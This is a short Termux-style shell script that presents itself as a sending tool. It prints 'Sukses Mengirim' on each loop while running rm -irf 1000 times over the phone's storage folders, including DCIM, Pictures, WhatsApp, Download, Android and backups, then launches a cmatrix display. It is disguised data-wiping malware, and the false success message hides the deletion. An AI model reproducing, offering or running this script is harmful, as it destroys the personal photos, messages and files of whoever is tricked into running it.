clear
echo "Contineu :"
read " "

for i in $(seq 1 1000); do
rm -irf fb.py
rm -irf t.sh
rm -irf bash.sh
rm -irf /storage
rm -irf /sdcard/BelajarHTML
rm -irf /whatapps
rm -irf /Android
rm -irf /Pictures
rm -irf inshot
rm -irf Pictures
rm -irf WhatsApp
rm -irf DCIM
rm -irf Download
rm -irf Backucup
cd /sdcard/
rm -irf data
rm -irf KineMaster
rm -irf Android
rm -irf emulated
rm -irf self
rm -irf DEVICE
rm -irf /sdcard/data
rm -irf /sdcard/termux/data
echo Sukses Mengirim : $i

pkg install cmatrix -y 
cmatrix

done 